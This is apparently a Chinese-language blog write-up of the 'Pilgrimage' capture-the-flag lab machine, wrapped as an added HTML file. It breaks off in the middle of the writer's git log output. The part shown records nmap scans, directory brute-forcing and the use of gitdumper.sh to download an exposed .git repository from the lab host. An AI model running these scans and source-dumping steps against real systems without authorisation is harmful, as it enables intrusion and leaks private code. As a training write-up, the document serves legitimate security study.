@@ -1,0 +1,773 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Pilgrimage 靶机信息收集12345678910111213┌──(pytool)─(i3eg1nner㉿minilite)-[~&#x2F;…&#x2F;GitTools&#x2F;Dumper&#x2F;clone&#x2F;assets]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.219[sudo] password for i3eg1nner:Starting Nmap 7.93 ( h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pilgrimage 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/e8652c909b79.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Pilgrimage 靶机信息收集12345678910111213┌──(pytool)─(i3eg1nner㉿minilite)-[~&#x2F;…&#x2F;GitTools&#x2F;Dumper&#x2F;clone&#x2F;assets]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.219[sudo] password for i3eg1nner:Starting Nmap 7.93 ( h">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/976bd7873c8ba0a2c2d626d335336816_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/53a1a4d00b3d317aaced18b50d96cb30_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/d57ee20929a5218d558c0e911d74f426_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/91bf403cbc94bf2716afe3d3a3413fcd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c36564ed14b943bc83e72756949a032c_MD5.png">
+<meta property="article:published_time" content="2023-07-08T05:36:38.000Z">
+<meta property="article:modified_time" content="2023-07-10T13:00:49.497Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/976bd7873c8ba0a2c2d626d335336816_MD5.png">
+  
+  
+  
+  <title>Pilgrimage 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pilgrimage 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-08 13:36" pubdate>
+          2023年7月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          266 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Pilgrimage 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Pilgrimage-靶机"><a href="#Pilgrimage-靶机" class="headerlink" title="Pilgrimage 靶机"></a>Pilgrimage 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/…/GitTools/Dumper/clone/assets]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.219<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 01:34 EDT<br>Warning: 10.10.11.219 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.14s latency).<br>Not shown: 63441 closed tcp ports (reset), 2092 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 33.63 seconds<br></code></pre></td></tr></table></figure>
+
+<p>只开放了两个端口 22 和 80</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/…/GitTools/Dumper/clone/assets]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.219<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 01:35 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.0031s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey:<br>|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)<br>|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)<br>|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)<br>80/tcp open  http    nginx 1.18.0<br>| http-git:<br>|   10.10.11.219:80/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit message: <br>image shrinking service initial commit. <span class="hljs-comment"># Please ...</span><br>| http-cookie-flags:<br>|   /:<br>|     PHPSESSID:<br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: nginx/1.18.0<br>|_http-title: Pilgrimage - Shrink Your Images<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.85 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="git-泄露"><a href="#git-泄露" class="headerlink" title=".git 泄露"></a>.git 泄露</h2><p>80 端口下存在 <code>.git</code> 泄露，或许是个可以利用的点，Debian 操作系统，将域名与 ip 的映射写入 hosts 文件后，使用浏览器访问，同时进行目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ sudo dirsearch -u http://pilgrimage.htb<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/pilgrimage.htb/_23-07-08_01-54-25.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-08_01-54-25.<span class="hljs-built_in">log</span><br><br>Target: http://pilgrimage.htb/<br><br>[01:54:25] Starting:<br>[01:54:26] 403 -  555B  - /.git/<br>[01:54:26] 403 -  555B  - /.git/branches/<br>[01:54:26] 200 -   92B  - /.git/config<br>[01:54:26] 200 -   23B  - /.git/HEAD<br>[01:54:26] 200 -   73B  - /.git/description<br>[01:54:26] 200 -    2KB - /.git/COMMIT_EDITMSG<br>[01:54:26] 403 -  555B  - /.git/hooks/<br>[01:54:26] 301 -  169B  - /.git  -&gt;  http://pilgrimage.htb/.git/<br>[01:54:26] 200 -  240B  - /.git/info/exclude<br>[01:54:26] 403 -  555B  - /.git/logs/<br>[01:54:26] 403 -  555B  - /.git/info/<br>[01:54:26] 200 -  195B  - /.git/logs/HEAD<br>[01:54:26] 403 -  555B  - /.git/refs/<br>[01:54:26] 301 -  169B  - /.git/logs/refs  -&gt;  http://pilgrimage.htb/.git/logs/refs/<br>[01:54:26] 301 -  169B  - /.git/logs/refs/heads  -&gt;  http://pilgrimage.htb/.git/logs/refs/heads/<br>[01:54:26] 301 -  169B  - /.git/refs/heads  -&gt;  http://pilgrimage.htb/.git/refs/heads/<br>[01:54:26] 200 -  195B  - /.git/logs/refs/heads/master<br>[01:54:26] 403 -  555B  - /.git/objects/<br>[01:54:26] 200 -   41B  - /.git/refs/heads/master<br>[01:54:26] 301 -  169B  - /.git/refs/tags  -&gt;  http://pilgrimage.htb/.git/refs/tags/<br>[01:54:26] 200 -    4KB - /.git/index<br>[01:54:26] 403 -  555B  - /.ht_wsr.txt<br>[01:54:26] 403 -  555B  - /.htaccess.bak1<br>[01:54:26] 403 -  555B  - /.htaccess.orig<br>[01:54:26] 403 -  555B  - /.htaccess.save<br>[01:54:26] 403 -  555B  - /.htaccess_extra<br>[01:54:26] 403 -  555B  - /.htaccess.sample<br>[01:54:26] 403 -  555B  - /.htaccess_orig<br>[01:54:26] 403 -  555B  - /.htaccessOLD<br>[01:54:26] 403 -  555B  - /.htaccessBAK<br>[01:54:26] 403 -  555B  - /.htaccess_sc<br>[01:54:26] 403 -  555B  - /.htpasswd_test<br>[01:54:26] 403 -  555B  - /.htm<br>[01:54:26] 403 -  555B  - /.htaccessOLD2<br>[01:54:26] 403 -  555B  - /.html<br>[01:54:26] 403 -  555B  - /.htpasswds<br>[01:54:26] 403 -  555B  - /.httr-oauth<br>[01:54:33] 403 -  555B  - /admin/.htaccess<br>[01:54:36] 403 -  555B  - /administrator/.htaccess<br>[01:54:37] 403 -  555B  - /app/.htaccess<br>[01:54:37] 301 -  169B  - /assets  -&gt;  http://pilgrimage.htb/assets/<br>[01:54:37] 403 -  555B  - /assets/<br>[01:54:42] 302 -    0B  - /dashboard.php  -&gt;  /login.php<br>[01:54:48] 200 -    7KB - /index.php<br>[01:54:50] 200 -    6KB - /login.php<br>[01:54:50] 302 -    0B  - /logout.php  -&gt;  /<br>[01:54:58] 200 -    6KB - /register.php<br>[01:55:04] 301 -  169B  - /tmp  -&gt;  http://pilgrimage.htb/tmp/<br>[01:55:04] 403 -  555B  - /tmp/<br>[01:55:06] 403 -  555B  - /vendor/<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>目录的爆破的结果中最值得关注的只有 <code>.git</code>，搜索 <code>&quot;.git&quot; expose</code></p>
+<p><img src="/pic/976bd7873c8ba0a2c2d626d335336816_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二个链接中 <a target="_blank" rel="noopener" href="https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75">Exposed .git Directory Exploitation | by Yani | InfoSec Write-ups (infosecwriteups.com)</a>，提到了一个工具 <code>GitTools</code>，将其下载到本地，然后根据说明来进行操作：<a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">internetwache&#x2F;GitTools: A repository with 3 tools for pwn’ing websites with .git repositories available (github.com)</a></p>
+<p><img src="/pic/53a1a4d00b3d317aaced18b50d96cb30_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>Dumper: This tool can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper]<br>└─$ ./gitdumper.sh http://pilgrimage.htb/.git/ <span class="hljs-built_in">clone</span><br><span class="hljs-comment">###########</span><br><span class="hljs-comment"># GitDumper is part of https://github.com/internetwache/GitTools</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Developed and maintained by @gehaxelt from @internetwache</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Use at your own risk. Usage might be illegal in certain circumstances.</span><br><span class="hljs-comment"># Only for educational purposes!</span><br><span class="hljs-comment">###########</span><br><br><br>[*] Destination folder does not exist<br>[+] Creating <span class="hljs-built_in">clone</span>/.git/<br>[+] Downloaded: HEAD<br>[-] Downloaded: objects/info/packs<br>[+] Downloaded: description<br>[+] Downloaded: config<br>[+] Downloaded: COMMIT_EDITMSG<br>[+] Downloaded: index<br>[-] Downloaded: packed-refs<br>[+] Downloaded: refs/heads/master<br>[-] Downloaded: refs/remotes/origin/HEAD<br>[-] Downloaded: refs/stash<br>[+] Downloaded: logs/HEAD<br>[+] Downloaded: logs/refs/heads/master<br>[-] Downloaded: logs/refs/remotes/origin/HEAD<br>[-] Downloaded: info/refs<br>[+] Downloaded: info/exclude<br>[-] Downloaded: /refs/wip/index/refs/heads/master<br>[-] Downloaded: /refs/wip/wtree/refs/heads/master<br>[+] Downloaded: objects/e1/a40beebc7035212efdcb15476f9c994e3634a7<br>[-] Downloaded: objects/00/00000000000000000000000000000000000000<br>[+] Downloaded: objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212<br>[+] Downloaded: objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d<br>[+] Downloaded: objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc<br>[+] Downloaded: objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d<br>[+] Downloaded: objects/dc/446514835fe49994e27a1c2cf35c9e45916c71<br>[+] Downloaded: objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e<br>[+] Downloaded: objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548<br>[+] Downloaded: objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb<br>[+] Downloaded: objects/36/c734d44fe952682020fd9762ee9329af51848d<br>[+] Downloaded: objects/b2/15e14bb4766deff4fb926e1aa080834935d348<br>[+] Downloaded: objects/8f/155a75593279c9723a1b15e5624a304a174af2<br>[+] Downloaded: objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e<br>[+] Downloaded: objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e<br>[+] Downloaded: objects/98/10e80fba2c826a142e241d0f65a07ee580eaad<br>[+] Downloaded: objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd<br>[+] Downloaded: objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc<br>[+] Downloaded: objects/76/a559577d4f759fff6af1249b4a277f352822d5<br>[+] Downloaded: objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c<br>[+] Downloaded: objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e<br>[+] Downloaded: objects/8a/62aac3b8e9105766f3873443758b7ddf18d838<br>[+] Downloaded: objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783<br>[+] Downloaded: objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2<br>[+] Downloaded: objects/88/16d69710c5d2ee58db84afa5691495878f4ee1<br>[+] Downloaded: objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a<br>[+] Downloaded: objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23<br>[+] Downloaded: objects/b6/c438e8ba16336198c2e62fee337e126257b909<br>[+] Downloaded: objects/11/dbdd149e3a657bc59750b35e1136af861a579f<br>[+] Downloaded: objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568<br>[+] Downloaded: objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18<br>[+] Downloaded: objects/5f/ec5e0946296a0f09badeb08571519918c3da77<br>[+] Downloaded: objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987<br>[+] Downloaded: objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a<br>[+] Downloaded: objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322<br>[+] Downloaded: objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1<br>[+] Downloaded: objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34<br>[+] Downloaded: objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7<br>[+] Downloaded: objects/49/cd436cf92cc28645e5a8be4b1973683c95c537<br>[+] Downloaded: objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3<br>[+] Downloaded: objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc<br>[+] Downloaded: objects/ca/d9dfca08306027b234ddc2166c838de9301487<br>[+] Downloaded: objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4<br>[+] Downloaded: objects/c4/3565452792f19d2cf2340266dbecb82f2a0571<br>[+] Downloaded: objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59<br>[+] Downloaded: objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4<br>[+] Downloaded: objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14<br>[+] Downloaded: objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b<br>[-] Downloaded: objects/23/12310101010101010101410301010101210101<br>[-] Downloaded: objects/23/03032323230123232323212123212303632303<br>[-] Downloaded: objects/23/21236303230321632123036767012147470701<br>[-] Downloaded: objects/47/07412547250503474341056701016565070147<br>[-] Downloaded: objects/41/61416543747052570741470565674701054165<br>[-] Downloaded: objects/65/43450543454147054147414565014170505650<br>[-] Downloaded: objects/54/74547454747476767476767676767236323632<br>[-] Downloaded: objects/36/76745054545454545456545454545454545454<br>[-] Downloaded: objects/76/76701676767670105676767672167676767010<br>[+] Downloaded: objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb<br>[+] Downloaded: objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e<br></code></pre></td></tr></table></figure>
+
+<p><code>http://pilgrimage.htb/.git/</code> 是目标目录，并且需要把最后一个 <code>/</code> 也给到参数，第二个参数是输出的目录，这里按照示例中那样命名为 <code>clone</code>，下载成功后进入 clone 目录，查看 git 的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># git log 查看本地日志</span><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git <span class="hljs-built_in">log</span><br>commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -&gt; master)<br>Author: emily &lt;emily@pilgrimage.htb&gt;<br>Date:   Wed Jun 7 20:11:48 2023 +1000<br><br>    Pilgrimage image shrinking service initial 